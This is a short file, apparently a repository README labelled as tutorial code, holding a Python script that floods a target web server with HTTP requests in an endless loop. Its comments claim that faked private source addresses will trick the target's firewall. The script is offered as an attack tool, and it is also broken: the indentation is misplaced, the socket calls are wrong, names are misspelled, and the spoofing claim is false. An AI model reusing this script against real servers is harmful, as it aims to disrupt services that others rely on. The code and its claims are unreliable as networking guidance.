# Python-tutorial-code
code


#code below


import socket
import time

#ip address of target here
target_ip = 'target_ip_addres'
target_port = 80

#set up the HTTP request headers
headers= f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozzilla/5.0 (windows)\r\n\r\n"

#using fake ips will trick the firewall to let us in well attempt to

fake_ips = ['10.0.0.1', '172.16.0.1', '192.168.0.1']


while True:
    for fake_ip in fake_ips:
        #create a socket and connect to the target
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        
#set tge source IP address to the fake IP address
sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
sock.bind((fake_ip, 0))

#send the HTTP request headers
sock.send(headers.encode())

#recive the print and response
respose = sock.recv(4096).decide()
print(response)

#close the socket
sock.close()

#sleep for a short time to avoid overwhelming the target
time.sleep(0.1)
